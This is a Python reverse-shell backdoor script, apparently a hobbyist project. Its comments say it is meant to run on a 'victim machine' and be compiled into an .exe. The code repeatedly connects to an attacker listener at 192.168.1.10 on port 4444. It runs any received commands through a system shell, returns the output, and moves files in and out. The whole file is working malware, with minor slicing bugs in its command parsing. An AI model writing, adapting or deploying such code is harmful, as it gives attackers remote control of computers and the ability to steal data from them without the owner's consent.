import socket
import time
import subprocess
import json
import os
'''

*This is the script which is intended to be run on the victim machine
 ie. as soon as the script is executed...our listener grabs the reverse shell back onto
the attackers machine.
**This script should be compiled into an .exe for fuctionality
***any comment is appreciated!
refer Python Docs on the topic of socket for more understanding of the script.

'''
def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('192.168.1.10', 4444))
            shell()
            s.close()
            break
        except:
            connection()

def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd':
            os.chdir(command[3:])
        elif command[:7] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
